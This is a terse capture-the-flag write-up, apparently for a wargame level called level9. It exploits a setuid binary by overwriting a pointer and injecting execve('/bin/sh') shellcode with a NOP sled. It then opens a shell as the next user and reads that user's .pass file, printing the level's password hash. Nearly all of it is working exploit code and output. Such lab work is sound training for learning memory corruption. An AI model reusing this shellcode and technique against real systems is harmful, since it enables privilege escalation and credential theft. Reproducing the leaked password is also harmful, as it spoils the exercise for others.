# level9

```sh
$> ls -l ~
-rwsr-s---+ 1 bonus0 users 6720 Mar  6  2016 level9
```

buffer's start addr: 0x0804a00c \x0c\xa0\x04\x08
buffer's end addr:   0x0804a078 \x78\xa0\x04\x08
0x0804a078 - 0x0804a00c = 0x78 = 120

4 + 21 + 83 + 4
25 + 87 = 112 

\x10\xa0\x04\x08
0x0804a010

0x0804a00c + 0x4 = 0x0804a010

0x0804a010 \x10\xa0\x04\x08


```sh
$> python -c 'print("\x10\xa0\x04\x08" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90"*83 + "\x0c\xa0\x04\x08")' > /tmp/payload

$> ./level9 $(cat /tmp/payload)
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```
